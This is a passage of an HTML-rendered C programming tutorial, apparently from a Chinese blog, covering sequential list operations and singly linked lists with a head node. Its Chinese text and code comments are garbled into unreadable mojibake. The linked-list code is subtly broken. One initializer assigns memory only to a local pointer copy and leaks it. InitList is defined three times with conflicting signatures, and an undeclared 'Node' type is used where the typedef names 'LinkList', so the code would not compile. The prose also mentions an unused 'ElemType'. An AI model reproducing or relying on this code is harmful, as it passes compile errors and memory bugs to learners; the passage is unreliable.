class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥ï¼\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// æ’å…¥å…ƒç´ åˆ°é¡ºåºè¡¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insertElement</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> position, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (position &lt; <span class="hljs-number">0</span> || position &gt; <span class="hljs-built_in">list</span>-&gt;size) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ’å…¥ä½ç½®ä¸åˆæ³•ï¼\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span>-&gt;size == <span class="hljs-built_in">list</span>-&gt;capacity) &#123;<br>        expandCapacity(<span class="hljs-built_in">list</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-built_in">list</span>-&gt;size; i &gt; position; i--) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data[i] = <span class="hljs-built_in">list</span>-&gt;data[i - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;data[position] = value;<br>    <span class="hljs-built_in">list</span>-&gt;size++;<br>&#125;<br><span class="hljs-comment">// åˆ é™¤é¡ºåºè¡¨ä¸­çš„å…ƒç´ </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteElement</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> position)</span> &#123;<br>    <span class="hljs-keyword">if</span> (position &lt; <span class="hljs-number">0</span> || position &gt;= <span class="hljs-built_in">list</span>-&gt;size) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤ä½ç½®ä¸åˆæ³•ï¼\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = position; i &lt; <span class="hljs-built_in">list</span>-&gt;size - <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data[i] = <span class="hljs-built_in">list</span>-&gt;data[i + <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;size--;<br>&#125;<br><span class="hljs-comment">// æŸ¥æ‰¾å…ƒç´ åœ¨é¡ºåºè¡¨ä¸­çš„ä½ç½®</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">findElement</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">list</span>-&gt;size; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span>-&gt;data[i] == value) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// æœªæ‰¾åˆ°è¿”å›-1</span><br>&#125;<br><span class="hljs-comment">// æ‰“å°é¡ºåºè¡¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printSeqList</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é¡ºåºè¡¨ï¼š&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">list</span>-&gt;size; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, <span class="hljs-built_in">list</span>-&gt;data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">// é‡Šæ”¾é¡ºåºè¡¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">destroySeqList</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-built_in">free</span>(<span class="hljs-built_in">list</span>-&gt;data);<br>    <span class="hljs-built_in">free</span>(<span class="hljs-built_in">list</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// åˆå§‹åŒ–é¡ºåºè¡¨</span><br>    SeqList *<span class="hljs-built_in">list</span> = initSeqList(<span class="hljs-number">5</span>);<br>    <span class="hljs-comment">// æ’å…¥å…ƒç´ </span><br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">1</span>, <span class="hljs-number">20</span>);<br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>, <span class="hljs-number">30</span>);<br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>, <span class="hljs-number">40</span>);<br>    insertElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">4</span>, <span class="hljs-number">50</span>);<br>    printSeqList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-comment">// åˆ é™¤å…ƒç´ </span><br>    deleteElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>);<br>    printSeqList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-comment">// æŸ¥æ‰¾å…ƒç´ </span><br>    <span class="hljs-type">int</span> pos = findElement(<span class="hljs-built_in">list</span>, <span class="hljs-number">40</span>);<br>    <span class="hljs-keyword">if</span> (pos != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å…ƒç´ 40çš„ä½ç½®æ˜¯ï¼š%d\n&quot;</span>, pos);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°å…ƒç´ 40\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// é‡Šæ”¾é¡ºåºè¡¨</span><br>    destroySeqList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h2><h3 id="å•é“¾è¡¨"><a href="#å•é“¾è¡¨" class="headerlink" title="å•é“¾è¡¨"></a>å•é“¾è¡¨</h3><p>â€‹       å•é“¾è¡¨æ˜¯ä¸€ç§é“¾å¼å­˜å‚¨çš„çº¿æ€§è¡¨ç»“æ„ã€‚</p><p>ç»“æ„å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// æ•°æ®åŸŸï¼Œå­˜å‚¨èŠ‚ç‚¹çš„æ•°æ®</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span>  <span class="hljs-comment">// æŒ‡é’ˆåŸŸï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span><br>&#125; LinkList;<br><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><ul><li><code>ElemType</code> æ˜¯èŠ‚ç‚¹çš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥æ˜¯ä»»ä½•åˆæ³•çš„æ•°æ®ç±»å‹ã€‚</li><li><code>data</code> åŸŸç”¨äºå­˜å‚¨èŠ‚ç‚¹çš„å®é™…æ•°æ®ã€‚</li><li><code>next</code> åŸŸæ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆã€‚<br>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½åªä¿å­˜äº†å®ƒåé¢ä¸€ä¸ªèŠ‚ç‚¹çš„åœ°å€ï¼Œä»è€Œå½¢æˆäº†ä¸€ä¸ªå•å‘çš„é“¾æ¥å…³ç³»ã€‚</li></ul><p>æ³¨æ„åŒºåˆ†ï¼šå¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨å’Œä¸å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨çš„åŒºåˆ«</p><ul><li><strong>å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨</strong>ï¼šæœ‰ä¸€ä¸ªä¸“é—¨çš„å¤´èŠ‚ç‚¹ï¼Œè¿™ä¸ªå¤´èŠ‚ç‚¹ä¸å­˜å‚¨æœ‰æ•ˆæ•°æ®ï¼Œåªæ˜¯ä½œä¸ºé“¾è¡¨çš„èµ·å§‹ä½ç½®ï¼Œç”¨æ¥ç®€åŒ–å¯¹é“¾è¡¨çš„æ’å…¥ã€åˆ é™¤ç­‰æ“ä½œã€‚</li><li><strong>ä¸å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨</strong>ï¼šé“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯å­˜å‚¨æœ‰æ•ˆæ•°æ®çš„èŠ‚ç‚¹ã€‚</li></ul><p>L-&gt;|     | -&gt;|   1  | -&gt; |   2   |   </p><p>L-&gt;|   1  | -&gt; |   2   |</p><p>ç‰ˆæœ¬ä¸€ï¼š</p><p>å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨å®ç°</p><ol><li>ä½¿ç”¨ä¸€ä¸ªé¢å¤–çš„å¤´èŠ‚ç‚¹ï¼Œå¤´èŠ‚ç‚¹ä¸å­˜å‚¨æœ‰æ•ˆæ•°æ®ã€‚</li><li>å¤´èŠ‚ç‚¹çš„ä½œç”¨æ˜¯æ–¹ä¾¿å¯¹é“¾è¡¨çš„æ“ä½œï¼Œä¾‹å¦‚åœ¨æ’å…¥ã€åˆ é™¤æ—¶ï¼Œä¸éœ€è¦åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©ºã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// æ•°æ®åŸŸï¼Œå­˜å‚¨èŠ‚ç‚¹çš„æ•°æ®</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span>  <span class="hljs-comment">// æŒ‡é’ˆåŸŸï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span><br>&#125; LinkList;<br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(LinkList *head)</span> &#123;<br>    <span class="hljs-comment">/* åˆå§‹åŒ–å¸¦å¤´ç»“ç‚¹çš„é“¾è¡¨å¤´æŒ‡é’ˆ */</span><br>    head = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList));  <span class="hljs-comment">// åˆ›å»ºå¤´ç»“ç‚¹</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;                            <span class="hljs-comment">// å¤´ç»“ç‚¹çš„ next æŒ‡å‘ NULLï¼Œè¡¨ç¤ºç©ºé“¾è¡¨</span><br>&#125;<br><span class="hljs-comment">/* ç”¨å¤´æ’æ³•å»ºç«‹å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ */</span><br>LinkList *<span class="hljs-title function_">AddHead</span><span class="hljs-params">()</span> &#123;<br>    LinkList *head, *p;<br>    <span class="hljs-type">int</span> x;<br>    head = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList));  <span class="hljs-comment">// åˆ›å»ºå¤´ç»“ç‚¹</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;            <span class="hljs-comment">// åˆå§‹åŒ–ä¸€ä¸ªç©ºé“¾è¡¨ï¼ŒLä¸ºå¤´æŒ‡é’ˆ</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥èŠ‚ç‚¹æ•°æ®ï¼ˆè¾“å…¥-1ç»“æŸï¼‰ï¼š&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);                   <span class="hljs-comment">// è¾“å…¥æ•°æ®</span><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">-1</span>) &#123;            <span class="hljs-comment">// å¾ªç¯æ¡ä»¶ï¼šè¾“å…¥å€¼ä¸ä¸º -1</span><br>        p = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// ç”Ÿæˆæ–°èŠ‚ç‚¹</span><br>        p-&gt;data = x;                   <span class="hljs-comment">// èµ‹å€¼ç»™æ–°èŠ‚ç‚¹</span><br>        p-&gt;next = head-&gt;next;         <span class="hljs-comment">// å°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°å¤´ç»“ç‚¹ä¹‹å</span><br>        head-&gt;next = p;                 <span class="hljs-comment">// æ›´æ–°å¤´ç»“ç‚¹çš„ next æŒ‡é’ˆ</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);            <span class="hljs-comment">// ç»§ç»­è¾“å…¥ä¸‹ä¸€ä¸ªæ•°æ®</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;                     <span class="hljs-comment">// è¿”å›å¤´æŒ‡é’ˆ</span><br>&#125;<br><span class="hljs-comment">/* å°¾æ’æ³•å»ºç«‹å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ */</span><br>LinkList *<span class="hljs-title function_">AddTail</span><span class="hljs-params">()</span> &#123;<br>    LinkList *head, *p, *q;<br>    <span class="hljs-type">int</span> x;<br>    head = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList));  <span class="hljs-comment">// åˆ›å»ºå¤´ç»“ç‚¹</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;               <span class="hljs-comment">// åˆå§‹åŒ–ä¸€ä¸ªç©ºé“¾è¡¨ï¼ŒLä¸ºå¤´æŒ‡é’ˆ</span><br>    q = head;                        <span class="hljs-comment">// å°¾æŒ‡é’ˆåˆå§‹åŒ–ä¸ºå¤´ç»“ç‚¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥èŠ‚ç‚¹æ•°æ®ï¼ˆè¾“å…¥-1ç»“æŸï¼‰ï¼š&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);                              <span class="hljs-comment">// è¾“å…¥æ•°æ®</span><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">-1</span>) &#123;                <span class="hljs-comment">// å¾ªç¯æ¡ä»¶ï¼šè¾“å…¥å€¼ä¸ä¸º -1</span><br>        p = (LinkList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// ç”Ÿæˆæ–°èŠ‚ç‚¹</span><br>        p-&gt;data = x;                <span class="hljs-comment">// èµ‹å€¼ç»™æ–°èŠ‚ç‚¹</span><br>        <span class="hljs-keyword">if</span>(head-&gt;next == <span class="hljs-literal">NULL</span> )&#123;<br>            head-&gt;next = p;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            q-&gt;next = p;<br>        &#125;<br>        q = p;                                  <span class="hljs-comment">// æ›´æ–°å°¾æŒ‡é’ˆ</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;x);                    <span class="hljs-comment">// ç»§ç»­è¾“å…¥ä¸‹ä¸€ä¸ªæ•°æ®</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(q!=<span class="hljs-literal">NULL</span>)&#123;<br>        q-&gt;next = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;                                  <span class="hljs-comment">// è¿”å›å¤´æŒ‡é’ˆ</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(LinkList *head)</span> &#123;<br>    head = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(LinkList)); <span class="hljs-comment">// åˆ›å»ºå¤´ç»“ç‚¹</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// å¤´ç»“ç‚¹çš„nextåˆå§‹åŒ–ä¸ºç©º</span><br>&#125;<br><br><br><span class="hljs-comment">// åˆå§‹åŒ–å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨</span><br>Node* <span class="hljs-title function_">InitList</span><span class="hljs-params">()</span> &#123;<br>    Node *head = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºå¤´èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    head-&gt;next = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// åˆå§‹åŒ–ä¸ºç©ºé“¾è¡¨</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><br><span class="hljs-comment">// åœ¨é“¾è¡¨æœ«å°¾æ’å…¥æ–°èŠ‚ç‚¹</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br><br>    Node *p = head; <span class="hljs-comment">// ä»å¤´èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p = p-&gt;next; <span class="hljs-comment">// æ‰¾åˆ°é“¾è¡¨çš„æœ«å°¾</span><br>    &#125;<br>    p-&gt;next = newNode; <span class="hljs-comment">// å°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°é“¾è¡¨æœ«å°¾</span><br>&#125;<br><br><span class="hljs-comment">// åœ¨æŒ‡å®šèŠ‚ç‚¹ä¹‹å‰æ’å…¥æ–°èŠ‚ç‚¹ï¼ˆå‰æ’æ³•ï¼‰</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertBefore</span><span class="hljs-params">(Node *head, Node *target, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç›®æ ‡èŠ‚ç‚¹ä¸ºç©ºï¼Œæ— æ³•æ’å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;next != target) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p-&gt;next == target) &#123;<br>        newNode-&gt;next = target;<br>        p-&gt;next = newNode;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(newNode);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// åœ¨æŒ‡å®šèŠ‚ç‚¹ä¹‹åæ’å…¥æ–°èŠ‚ç‚¹ï¼ˆåæ’æ³•ï¼‰</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertAfter</span><span class="hljs-params">(Node *target, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç›®æ ‡èŠ‚ç‚¹ä¸ºç©ºï¼Œæ— æ³•æ’å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = target-&gt;next;<br>    target-&gt;next = newNode;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°é“¾è¡¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(Node *head)</span> &#123;<br>    Node *p = head-&gt;next; <span class="hljs-comment">// ä»å¤´èŠ‚ç‚¹åçš„ç¬¬ä¸€ä¸ªæœ‰æ•ˆèŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span 